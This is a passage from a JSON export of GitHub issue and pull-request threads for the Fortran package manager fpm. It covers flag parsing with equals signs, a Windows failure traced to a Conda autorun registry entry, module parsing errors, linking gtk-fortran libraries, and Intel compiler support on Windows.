                    "text": "There is still an open issue with the dependency tree, I believe that it is a bad idea to introduce the parent nodes in the tree structure to fix that we are working with the flattened dependency tree, instead we should define the connectivity in with the child nodes and just walk the graph to apply the profiles. This is something I promised to look into, but haven't found the time yet to create a patch with a proper implementation.\nOf course the dependency tree issue is only one part of this patch, the different build directories and the profiles for the package manifest are fine. Therefore, my suggestion was to use the build directory implementation from this patch for fixing #422 and get the first part of this project into the fpm main branch. This way we can make the changes introduced here more modular without affecting all parts of fpm at once."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-20 21:54:57+00:00",
                    "text": "I started updating the build directory change from this patch in #575. Please have a look if this is sufficient to implement the compiler profiles in the target generation."
                }
            ]
        },
        {
            "number": 497,
            "user": "urbanjost",
            "date": "2021-06-18 05:55:21+00:00",
            "title": "correct for equal sign in flag options to fix #495",
            "text": "Correction to allow for = in --flag option and also allow --keyword=value syntax on options\n   fpm run --flag -fsanitize=address",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-21 11:09:50+00:00",
                    "text": "With two approvals, I'll now merge this. Thanks @urbanjost"
                }
            ]
        },
        {
            "number": 496,
            "user": "RecruitMain707",
            "date": "2021-06-17 08:51:44+00:00",
            "title": "Fpm fails to create a new project in Windows",
            "text": "I downloaded the latest precompiled binary, running fpm --help works, but i cannot create a new project.\nrunning this: fpm new fpm-test\noutputs this:\nThe system could not find the specified route.\nThe system could not find the specified route.\nThe system could not find the specified route.\nThe system could not find the specified route.\nThe system could not find the specified route.\n + mkdir test-fpm\n execute_command_line() failed\nERROR STOP\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n\nBuilding a manually created project doesnt work either, so i guess its a problem related to running commands.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-19 09:10:26+00:00",
                    "text": "Thanks for reporting @RecruitMain707. May I ask whether the same message appears when you run other commands in Windows command prompt such as dir or cd?"
                },
                {
                    "user": "RecruitMain707",
                    "date": "2021-06-19 19:47:48+00:00",
                    "text": "No, it only appears when i try to use fpm commands\n(ie, fpm new test, fpm build, etc)"
                },
                {
                    "user": "brocolis",
                    "date": "2021-06-20 23:14:37+00:00",
                    "text": "Hi @RecruitMain707, which fpm binary are you using? This one https://github.com/fortran-lang/fpm/releases/download/v0.2.0/fpm-0.2.0-windows-x86_64.exe works for me in Windows 10 x64."
                },
                {
                    "user": "RecruitMain707",
                    "date": "2021-06-21 16:14:59+00:00",
                    "text": "Hello, i am using the latest release, yes, am i missing some requisite perhaps?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-21 18:08:57+00:00",
                    "text": "am i missing some requisite perhaps?\n\nThe release binaries are self-contained and hence you shouldn't need to download/install any other prerequisites.\nCan you tell us what the output is when you run the following commands from command prompt:\nREG QUERY \"HKLM\\Software\\Microsoft\\Command Processor\"\nREG QUERY \"HKCU\\Software\\Microsoft\\Command Processor\""
                },
                {
                    "user": "RecruitMain707",
                    "date": "2021-06-21 19:08:14+00:00",
                    "text": "sure:\n> REG QUERY \"HKLM\\Software\\Microsoft\\Command Processor\"\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Command Processor\n    DefaultColor    REG_DWORD    0x0\n    EnableExtensions    REG_DWORD    0x1\n    CompletionChar    REG_DWORD    0x40\n    PathCompletionChar    REG_DWORD    0x40\n> REG QUERY \"HKCU\\Software\\Microsoft\\Command Processor\"\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor\n    Autorun    REG_EXPAND_SZ    \"C:\\ProgramData\\Anaconda3\\condabin\\conda_hook.bat\"\n    CompletionChar    REG_DWORD    0x9\n    DefaultColor    REG_DWORD    0x0\n    EnableExtensions    REG_DWORD    0x1\n    PathCompletionChar    REG_DWORD    0x9"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-21 19:28:11+00:00",
                    "text": "Thanks - I think you have an old or outdated autorun script (C:\\ProgramData\\Anaconda3\\condabin\\conda_hook.bat) running every time command prompt starts. I'm not sure what the recommended procedure is for fixing a Conda installation - perhaps conda init --reverse and/or conda init?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-22 08:53:08+00:00",
                    "text": "Hi @RecruitMain707, can you try running the following commands:\nREG DELETE \"HKCU\\Software\\Microsoft\\Command Processor\" /v Autorun\nconda init\nand then try fpm again?"
                },
                {
                    "user": "RecruitMain707",
                    "date": "2021-06-28 09:40:19+00:00",
                    "text": "Sorry for the long wait, i uninstalled conda a while back, so i only had to remove it, it now works perfectly, thank you so much."
                }
            ]
        },
        {
            "number": 495,
            "user": "LKedward",
            "date": "2021-06-15 17:49:52+00:00",
            "title": "Can't pass flags containing an equals sign(=) with multiple executables",
            "text": "I was trying to pass the -fsanitize=address flag to gfortran, but fpm/M_CLI2 is treating address as an unnamed parameter.\nTo reproduce:\n$ fpm new test && cd test\n$ cp app/main.f90 app/main2.f90\n$ fpm run --flag \"-fsanitize=address\"\nOutput:\n + mkdir -p build/dependencies\nfpm::run<ERROR> specified names \"address\" not found.\n\n Available names:\nmain2  test\nSTOP 1",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-06-17 10:28:50+00:00",
                    "text": "Doing some further testing but will put in a pull request to use a more recent version of M_CLI2. Trying to decide what all needs added to test suite too.\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nrev = \"143ab3a4b4f82810f2dda2333cb5a0f116b955e5\""
                }
            ]
        },
        {
            "number": 491,
            "user": "LKedward",
            "date": "2021-06-05 13:57:39+00:00",
            "title": "Catch execute_command_line errors and print useful messages",
            "text": "Adds an exitstat argument to the execute_command_line wrapper run so that failures can be caught and useful messages printed instead of the error stop backtrace.\nThis makes it much easier to determine which source files failed to compile, or which apps/tests failed to run.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-20 08:56:55+00:00",
                    "text": "Thanks for the review - I think once this and #497 are merged, it would be a good time for a new release (0.3.0)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-20 09:17:19+00:00",
                    "text": "I don't see any breaking changes in the CLI or manifest, but just added features and bugfixes, therefore I think it should be 0.2.1"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-20 12:14:16+00:00",
                    "text": "Ah yes, am I misinterpreting the discussion in #399 - I'd thought we'd bump minor for any changes during 0.x.x?\nAlso #412 does break fpm support for packages that have duplicate modules, but I guess that was never officially supported."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-20 12:56:10+00:00",
                    "text": "I think the strategy used in Julia's Pkg is not a bad one for versioning in the pre-1.0 stage: https://pkgdocs.julialang.org/v1/compatibility/#compat-pre-1.0-1. Which means in pre-1.0 same minor versions are mostly compatible."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-23 10:03:11+00:00",
                    "text": "Thanks for reviewing, I'll now merge. Will put together a separate PR for bumping the version now."
                }
            ]
        },
        {
            "number": 490,
            "user": "LKedward",
            "date": "2021-06-05 13:24:25+00:00",
            "title": "Fix module parsing",
            "text": "Fixes #488",
            "comments": []
        },
        {
            "number": 489,
            "user": "awvwgk",
            "date": "2021-06-05 13:04:44+00:00",
            "title": "Redirect output when searching for archiver",
            "text": "Requires some shuffling of routines to avoid dependency cycles.\nFixes #456",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-06-06 01:26:48+00:00",
                    "text": "Thanks @awvwgk, it works great in my default environment. However, when I switch to the Intel oneAPI environment, remove GCC toolchain from the PATH and run fpm build --compiler ifort, it displays the message \"ar is not recognized as an internal or external command, operable program or batch file.\" After that, the build continues and ends successfully.\nC:\\Temp\\test5>fpm build --compiler ifort\n + mkdir build\\dependencies\n'ar' is not recognized as an internal or external command, operable program or batch file.\n + mkdir build\\ifort_782887A201FCE169\\test5\n + ifort -c test\\check.f90 /warn:all /check:all \u2026"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-06 07:36:08+00:00",
                    "text": "@brocolis should be fixed now."
                },
                {
                    "user": "brocolis",
                    "date": "2021-06-07 01:08:17+00:00",
                    "text": "I've tested the patch in 3 environments, they all work well, thanks @awvwgk \ud83d\udc4d\n\n\n\nToolchain available on PATH\nfpm test --compiler gfortran\nfpm test --compiler ifort\nfpm test --compiler ifx\n\n\n\n\nMinGW\n\u2705\n-\n-\n\n\noneAPI\n-\n\u2705\n\u2705\n\n\noneAPI + MinGW\n\u2705\n\u2705\n\u2705\n\n\n\nIn environments (1) and (3), fpm executes ar, while in environment (2), fpm executes lib. I think the use of ar in (3) is a bit inconsistent but it does not cause harm so far and can be resolved later."
                },
                {
                    "user": "brocolis",
                    "date": "2021-06-07 01:33:46+00:00",
                    "text": "In scenario (4), MinGW is found on PATH before Intel oneAPI. It's unusual but it works also.\n\n\n\nToolchain available on PATH\nfpm test --compiler gfortran\nfpm test --compiler ifort\nfpm test --compiler ifx\n\n\n\n\nMinGW\n\u2705\n-\n-\n\n\noneAPI\n-\n\u2705\n\u2705\n\n\noneAPI + MinGW\n\u2705\n\u2705\n\u2705\n\n\nMinGW + oneAPI\n\u2705\n\u2705\n\u2705"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-07 08:34:30+00:00",
                    "text": "Thanks for the thorough testing @brocolis! With that I'll now merge"
                }
            ]
        },
        {
            "number": 488,
            "user": "everythingfunctional",
            "date": "2021-06-04 15:42:23+00:00",
            "title": "Erroneous error message",
            "text": "I am trying to convert an existing project to using fpm. Unfortunately (or maybe not), fpm complains about an invalid module name for something that is not defining a module. Granted this is not the kind of code I'd ever expect to actually encounter, but it is something to consider. The specific error message is:\nParse error: empty or invalid name for module\n././src/pfm/distributions_m.f90:52:12\n   |     module real*8 function get_log_logistic_p(x,a,b,c)\n   |            ^\n\nThis is at an intermediate step in converting some legacy code, so that real*8 will get removed, but this is a general situation that could arise that the parser needs to handle. The idea is that for module <other_stuff> function | subroutine, this isn't defining a module, so just skip it.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-04 15:49:54+00:00",
                    "text": "Thanks for reporting - I'll look at putting together a fix for this case. I'm hoping to push some improvements to the source parsing module in the future to improve robustness and maintainability."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-06-04 17:33:49+00:00",
                    "text": "Just as additional info, I also got a duplicate module error on the same project due to declarations like module double precision function after fixing that issue. It would be nice if that error message included the name of the module it thinks is a duplicate, as that one took me a bit to work out."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-05 14:09:31+00:00",
                    "text": "@everythingfunctional, are you sure it didn't print the names of the duplicate modules?.\nThe code linked below should print the duplicates:\n\n  \n    \n      fpm/src/fpm.f90\n    \n    \n        Lines 233 to 234\n      in\n      87a2cbf\n    \n    \n    \n    \n\n        \n          \n           write(error_unit, *) \"Warning: Module \",model%packages(k)%sources(l)%modules_provided(m)%s, & \n        \n\n        \n          \n             \" in \",model%packages(k)%sources(l)%file_name,\" is a duplicate\""
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-06-08 14:14:38+00:00",
                    "text": "@LKedward I think maybe I just missed it. I just tried to reproduce it and got this:\nWarning: Module double in ././src/pfm/radiation_shift_m.f90 is a duplicate\n\nSo maybe I just didn't realize that double was the name of the module it thought it found. Maybe we should put quotes around the module name to make it clearer?"
                }
            ]
        },
        {
            "number": 487,
            "user": "vmagnin",
            "date": "2021-06-03 13:46:31+00:00",
            "title": "Failed to build a simple gtk-fortran example: how to link with gtk-4-fortran?",
            "text": "I have created a small repository with the example I am trying to build as an fpm project:\nhttps://github.com/vmagnin/gtkzero_fpm\nIt is the gtkzero_gapp.f90 available in the gtk-fortran gtk4 branch: it just opens an empty GTK 4 window. As the original file contains the main program and a handlers module, I have put that module in src/handlers.f90. The main program has been renamed: app/main.f90.\nMy fpm version is 0.2.0 alpha. I have tried adding link = \"gtk-4-fortran\" in the [build] section of the fpm.toml file, but it does not change anything.\n$ fpm build --flag '$(pkg-config --cflags --libs gtk-4-fortran)'\nUnable to find source for module dependency: \"gtk\" used by \"app/main.f90\"\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x7f559b678820 in ???\n#1  0x7f559b679379 in ???\n#2  0x7f559b67ab02 in ???\n#3  0x55e89918f6a5 in __fpm_MOD_cmd_build\n        at ././src/fpm.f90:260\n#4  0x55e89917944f in MAIN__\n        at app/main.f90:26\n#5  0x55e89917944f in main\n        at app/main.f90:9\nSame error if I replace the apostrophes by double quotes.\nThis is the output of the pkg-config command on my machine:\n$ pkg-config --cflags --libs gtk-4-fortran\n-rdynamic -mfpmath=sse -msse -msse2 -pthread -I/usr/local/include/gtk-4-fortran -I/usr/include/gtk-4.0 -I/usr/include/gio-unix-2.0 -I/usr/include/cairo -I/usr/include/pango-1.0 -I/usr/include/harfbuzz -I/usr/include/pango-1.0 -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/gdk-pixbuf-2.0 -I/usr/include/cairo -I/usr/include/pixman-1 -I/usr/include/uuid -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/graphene-1.0 -I/usr/lib/x86_64-linux-gnu/graphene-1.0/include -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -Xlinker -R/usr/local/lib -lgtk-4-fortran -lgtk-4 -lpangocairo-1.0 -lpango-1.0 -lharfbuzz -lgdk_pixbuf-2.0 -lcairo-gobject -lcairo -lvulkan -lgraphene-1.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0\nThe gtk-fortran modules are here:\n$ ls /usr/local/include/gtk-4-fortran\ncairo.mod          g.mod                 gtk_hl_button.mod     gtk_hl_entry.mod     gtk_hl_spin_slider.mod  handlers_gtk_fortran.mod\ngdk_events.mod     graphene.mod          gtk_hl_chooser.mod    gtk_hl_infobar.mod   gtk_hl_tree.mod         pango.mod\ngdk.mod            gsk.mod               gtk_hl_combobox.mod   gtk_hl_misc.mod      gtk.mod                 plplot_extra.mod\ngdk_pixbuf_hl.mod  gtk_draw_hl.mod       gtk_hl_container.mod  gtk_hl.mod           gtk_os_dependent.mod    unix_print.mod\ngdk_pixbuf.mod     gtk_hl_assistant.mod  gtk_hl_dialog.mod     gtk_hl_progress.mod  gtk_sup.mod",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-06-03 14:04:51+00:00",
                    "text": "External module files have to declared explicitly, see here. In this case it would require an additional entry in the build section:\n[build]\nlink = \"gtk-4-fortran\"\nexternal-modules = [\"gtk\", \"g\"]"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-03 14:23:25+00:00",
                    "text": "In this case it would require an additional entry in the build section:\n\nMy fpm does not like that new line :-(\n$ fpm build --flag \"$(pkg-config --cflags --libs gtk-4-fortran)\"\nKey external-modules is not allowed in [build]\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x7f641f428820 in ???\nPerhaps not yet in fpm 0.2.0 ?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-03 14:26:30+00:00",
                    "text": "You're right, it was added with #438 but hasn't been released yet."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-23 12:02:37+00:00",
                    "text": "This might be resolved with the freshly released fpm version 0.3.0"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-23 14:07:57+00:00",
                    "text": "Thanks @awvwgk for the information,\nI will try when I have some time and report here the result."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-23 15:17:46+00:00",
                    "text": "@awvwgk\nI have just installed fpm 0.3.0 alpha (Ubuntu 21.04).\nIt's better but the linking fails with the same little test project (https://github.com/vmagnin/gtkzero_fpm):\n$ fpm build --flag '$(pkg-config --cflags --libs gtk-4-fortran)'\n + mkdir -p build/dependencies\n + mkdir -p build/gfortran_4E42016360FFAE8D/gtkzero_fpm\n + gfortran -c test/check.f90 $(pkg-config --cflags --libs gtk-4-fortran) -J build/gfortran_4E42016360FFAE8D/gtkzero_fpm -I build/gfortran_4E42016360FFAE8D/gtkzero_fpm  -o build/gfortran_4E42016360FFAE8D/gtkzero_fpm/test_check.f90.o\n + gfortran -c ././src/handlers.f90 $(pkg-config --cflags --libs gtk-4-fortran) -J build/gfortran_4E42016360FFAE8D/gtkzero_fpm -I build/gfortran_4E42016360FFAE8D/gtkzero_fpm  -o build/gfortran_4E42016360FFAE8D/gtkzero_fpm/src_handlers.f90.o\n + ar -rs build/gfortran_4E42016360FFAE8D/gtkzero_fpm/libgtkzero_fpm.a build/gfortran_4E42016360FFAE8D/gtkzero_fpm/src_handlers.f90.o\nar: cr\u00e9ation de build/gfortran_4E42016360FFAE8D/gtkzero_fpm/libgtkzero_fpm.a\n + gfortran -c app/main.f90 $(pkg-config --cflags --libs gtk-4-fortran) -J build/gfortran_4E42016360FFAE8D/gtkzero_fpm -I build/gfortran_4E42016360FFAE8D/gtkzero_fpm  -o build/gfortran_4E42016360FFAE8D/gtkzero_fpm/app_main.f90.o\n + mkdir -p build/gfortran_4E42016360FFAE8D/app/\n + gfortran  $(pkg-config --cflags --libs gtk-4-fortran) -J build/gfortran_4E42016360FFAE8D/gtkzero_fpm -I build/gfortran_4E42016360FFAE8D/gtkzero_fpm  build/gfortran_4E42016360FFAE8D/gtkzero_fpm/app_main.f90.o build/gfortran_4E42016360FFAE8D/gtkzero_fpm/libgtkzero_fpm.a -lgtk-4-fortran -o build/gfortran_4E42016360FFAE8D/app/gtkzero_fpm\n/usr/bin/ld: build/gfortran_4E42016360FFAE8D/gtkzero_fpm/app_main.f90.o: undefined reference to symbol 'gtk_application_new'\n/usr/bin/ld\u00a0: /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/libgtk-4.so\u00a0: erreur lors de l'ajout de symboles\u00a0: DSO missing from command line\ncollect2: error: ld returned 1 exit status\n <ERROR> Compilation failed for object \"gtkzero_fpm\"\nSTOP 1\nNote that if I type the following command, it compiles and runs:\n$ gfortran src/handlers.f90 app/main.f90 $(pkg-config --cflags --libs gtk-4-fortran)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-23 15:27:06+00:00",
                    "text": "The problem is that you are adding the libs with the --flag command, and they will end up in-front of the objects in the link line.\nYou probably have to add the output of pkg-config --libs gtk-4-fortran to the build.link entry in the package manifest, rather than using it with the --flag switch."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-23 16:13:33+00:00",
                    "text": "Thanks Sebastian @awvwgk\nI have separated the --cflags and --libs parts of the pkg-config command. I am now using the following command:\n$  fpm build --flag '$(pkg-config --cflags gtk-4-fortran) -Xlinker -R/usr/local/lib'\n\nIn the fpm.toml, I first tried:\nlink = \"gtk-4 pangocairo-1.0 pango-1.0 harfbuzz gdk_pixbuf-2.0 cairo-gobject cairo vulkan graphene-1.0 gio-2.0 gobject-2.0 glib-2.0 gtk-4-fortran\"\n\nThe problem is that on the compilation command lines, only the first library is prefixed with -l (-lgtk-4 pangocairo-1.0 pango-1.0 harfbuzz gdk_pixbuf-2.0 cairo-gobject cairo vulkan graphene-1.0 gio-2.0 gobject-2.0 glib-2.0 gtk-4-fortran)\nI was therefore obliged to add -l in front of all the other libraries:\nlink = \"gtk-4 -lpangocairo-1.0 -lpango-1.0 -lharfbuzz -lgdk_pixbuf-2.0 -lcairo-gobject -lcairo -lvulkan -lgraphene-1.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0 -lgtk-4-fortran\"\n\nIn that case, the build is OK with:\n$  fpm build --flag '$(pkg-config --cflags gtk-4-fortran) -Xlinker -R/usr/local/lib'\n\nBut if I run:\n$ fpm run\n + mkdir -p build/gfortran_2A42023B310FA28D/gtkzero_fpm\n + gfortran -c test/check.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/gtkzero_fpm -I build/gfortran_2A42023B310FA28D/gtkzero_fpm  -o build/gfortran_2A42023B310FA28D/gtkzero_fpm/test_check.f90.o\n + gfortran -c ./src/handlers.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/gtkzero_fpm -I build/gfortran_2A42023B310FA28D/gtkzero_fpm  -o build/gfortran_2A42023B310FA28D/gtkzero_fpm/src_handlers.f90.o\n./src/handlers.f90:7:7:\n\n\t7 |   use gtk, only: gtk_window_set_default_size, gtk_window_set_title, &\n\t  |       1\nFatal Error: Cannot open module file \u2018gtk.mod\u2019 for reading at (1): Aucun fichier ou dossier de ce type\ncompilation terminated.\n <ERROR> Compilation failed for object \"src_handlers.f90.o\"\nSTOP 1\nFinally it runs successfully if I use the --flag options with fpm run:\n$ fpm run --flag '$(pkg-config --cflags gtk-4-fortran) -Xlinker -R/usr/local/lib'"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-23 16:25:14+00:00",
                    "text": "The problem is that on the compilation command lines, only the first library is prefixed with -l (-lgtk-4 pangocairo-1.0 pango-1.0 harfbuzz gdk_pixbuf-2.0 cairo-gobject cairo vulkan graphene-1.0 gio-2.0 gobject-2.0 glib-2.0 gtk-4-fortran)\n\nbuild.link takes a list of strings or a single string as shortcut for a list with one entry:\nbuild.link = [\n  \"gtk-4\",\n  \"pangocairo-1.0\",\n  \"pango-1.0\",\n  \"harfbuzz\",\n  \"gdk_pixbuf-2.0\",\n  \"cairo-gobject\",\n  \"cairo\",\n  \"vulkan\",\n  \"graphene-1.0\",\n  \"gio-2.0\",\n  \"gobject-2.0\",\n  \"glib-2.0\",\n  \"gtk-4-fortran\",\n]\nIt's quite a lot of libraries to specify explicitly, unfortunately."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-23 17:02:59+00:00",
                    "text": "OK @awvwgk , I should have thought that it must be a list like in my external-modules = [\"gtk\", \"g\"] line.\nSo, now everything is OK with those commands:\n$ fpm build --flag '$(pkg-config --cflags gtk-4-fortran) -Xlinker -R/usr/local/lib'\nand\n$  fpm run --flag '$(pkg-config --cflags gtk-4-fortran) -Xlinker -R/usr/local/lib'\nBut I don't understand why I am obliged to use --flag with fpm run... (see my previous message for the error message if I don't add the flags). If I go into the build directory and I click on the executable it runs fine. So what does fpm run does?"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-23 17:08:15+00:00",
                    "text": "Note also that all the libraries are not needed for all programs, that's just for the general case.\nFor that small example, we just need:\nlink = [\n  \"gtk-4\",\n  \"gio-2.0\",\n  \"gobject-2.0\",\n  \"glib-2.0\",\n  \"gtk-4-fortran\",\n]"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-23 17:08:35+00:00",
                    "text": "fpm is stateless, if you use fpm run it will first invoke fpm build to make sure the binary is up-to-date, to select the binary the command line arguments are hashed, therefore every fpm command has to know the full list of flags to select the right build.\nBetter pkg-config support would resolve this issue of having to use --flag mostly, maybe something like\n[dependencies]\ngtk-4-fortran.pkg-config = \"gtk-4-fortran\"\ncould be an option."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-06-24 17:15:27+00:00",
                    "text": "Thanks for all!\nI have added a How to use fpm to build a gtk-fortran project in the gtk-fortran wiki."
                }
            ]
        },
        {
            "number": 486,
            "user": "brocolis",
            "date": "2021-06-03 00:18:29+00:00",
            "title": "fpm project with C source; Intel compilers on Windows",
            "text": "I was trying to build an fpm project with Intel compilers on Windows and was running into issue.\nC:\\Temp\\test>fpm run --compiler ifort\n + mkdir build\\dependencies\nGNU ar (GNU Binutils) 2.36.1\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License version 3 or (at your option) any later version.\nThis program has absolutely no warranty.\n + mkdir build\\ifort_FA91F1929995A164\\test\n + ifort -c test\\check.f90 /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /traceback /Qcoarray:single /module:build\\ifort_FA91F1929995A164\\test /Ibuild\\ifort_FA91F1929995A164\\test  -o build\\ifort_FA91F1929995A164\\test\\test_check.f90.o\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.2.0 Build 20210228_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\n + icc -c .\\.\\src\\csource.c -o build\\ifort_FA91F1929995A164\\test\\src_csource.c.o\n'icc' is not recognized as an internal or external command, operable program or batch file.\n Command failed\nERROR STOP\n\nC source is src/csource.c\nint func(void) { return 0;}\nI would add an special case\ncase(id_intel_classic_windows)\n    c_compiler = 'icl'\nto https://github.com/fortran-lang/fpm/blob/master/src/fpm_compiler.f90#L341 and create a PR. But it wouldn't solve it, because icl syntax for 'compile-only, do not link', is icl /c file.c /Fofile.obj and that requires a change in https://github.com/fortran-lang/fpm/blob/master/src/fpm_backend.f90#L243. My understanding is that I should not add compiler specific flags to fpm_backend.f90.\n[1] icl syntax: https://software.intel.com/content/www/us/en/develop/documentation/cpp-compiler-developer-guide-and-reference/top/compiler-setup/using-the-command-line/using-compiler-options.html",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-06-03 00:51:03+00:00",
                    "text": "The project builds with fpm run --compiler ifx.\nHere is the output:\nC:\\Temp\\test>fpm run --compiler ifx\n + mkdir build\\dependencies\nGNU ar (GNU Binutils) 2.36.1\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License version 3 or (at your option) any later version.\nThis program has absolutely no warranty.\n + mkdir build\\ifx_38882BE0A4E5729B\\test\n + ifx -c test\\check.f90 /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /Qcoarray:single /module:build\\ifx_38882BE0A4E5729B\\test /Ibuild\\ifx_38882BE0A4E5729B\\test  -o build\\ifx_38882BE0A4E5729B\\test\\test_check.f90.o\nIntel(R) Fortran Compiler for applications running on Intel(R) 64, Version 2021.2.0 Beta Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\ntest/check.f90: remark #5415: Feature not yet implemented: Some 'check' options temporarily disabled.\n + icx -c .\\.\\src\\csource.c -o build\\ifx_38882BE0A4E5729B\\test\\src_csource.c.o\nIntel(R) oneAPI DPC++/C++ Compiler for applications running on Intel(R) 64, Version 2021.2.0 Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\n + ifx -c .\\.\\src\\test.f90 /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /Qcoarray:single /module:build\\ifx_38882BE0A4E5729B\\test /Ibuild\\ifx_38882BE0A4E5729B\\test  -o build\\ifx_38882BE0A4E5729B\\test\\src_test.f90.o\nIntel(R) Fortran Compiler for applications running on Intel(R) 64, Version 2021.2.0 Beta Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\n././src/test.f90: remark #5415: Feature not yet implemented: Some 'check' options temporarily disabled.\n + ar -rs build\\ifx_38882BE0A4E5729B\\test\\libtest.a build\\ifx_38882BE0A4E5729B\\test\\src_csource.c.o build\\ifx_38882BE0A4E5729B\\test\\src_test.f90.o\nar: creating build\\ifx_38882BE0A4E5729B\\test\\libtest.a\n + ifx -c app\\main.f90 /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /Qcoarray:single /module:build\\ifx_38882BE0A4E5729B\\test /Ibuild\\ifx_38882BE0A4E5729B\\test  -o build\\ifx_38882BE0A4E5729B\\test\\app_main.f90.o\nIntel(R) Fortran Compiler for applications running on Intel(R) 64, Version 2021.2.0 Beta Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\napp/main.f90: remark #5415: Feature not yet implemented: Some 'check' options temporarily disabled.\n + mkdir build\\ifx_38882BE0A4E5729B\\app\\\n + ifx  /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /Qcoarray:single /module:build\\ifx_38882BE0A4E5729B\\test /Ibuild\\ifx_38882BE0A4E5729B\\test  build\\ifx_38882BE0A4E5729B\\test\\app_main.f90.o build\\ifx_38882BE0A4E5729B\\test\\libtest.a -o build\\ifx_38882BE0A4E5729B\\app\\test.exe\nIntel(R) Fortran Compiler for applications running on Intel(R) 64, Version 2021.2.0 Beta Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\nMicrosoft (R) Incremental Linker Version 14.29.30037.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:build/ifx_38882BE0A4E5729B/app/test.exe\n-debug\n-pdb:build/ifx_38882BE0A4E5729B/app/test.pdb\n-subsystem:console\nbuild/ifx_38882BE0A4E5729B/test/app_main.f90.o\nbuild/ifx_38882BE0A4E5729B/test/libtest.a\n + ifx  /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /Qcoarray:single /module:build\\ifx_38882BE0A4E5729B\\test /Ibuild\\ifx_38882BE0A4E5729B\\test  build\\ifx_38882BE0A4E5729B\\test\\test_check.f90.o build\\ifx_38882BE0A4E5729B\\test\\libtest.a -o build\\ifx_38882BE0A4E5729B\\test\\check.exe\nIntel(R) Fortran Compiler for applications running on Intel(R) 64, Version 2021.2.0 Beta Build 20210317\nCopyright (C) 1985-2021 Intel Corporation. All rights reserved.\n\nMicrosoft (R) Incremental Linker Version 14.29.30037.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:build/ifx_38882BE0A4E5729B/test/check.exe\n-debug\n-pdb:build/ifx_38882BE0A4E5729B/test/check.pdb\n-subsystem:console\nbuild/ifx_38882BE0A4E5729B/test/test_check.f90.o\nbuild/ifx_38882BE0A4E5729B/test/libtest.a\n Hello, test!\n\nI 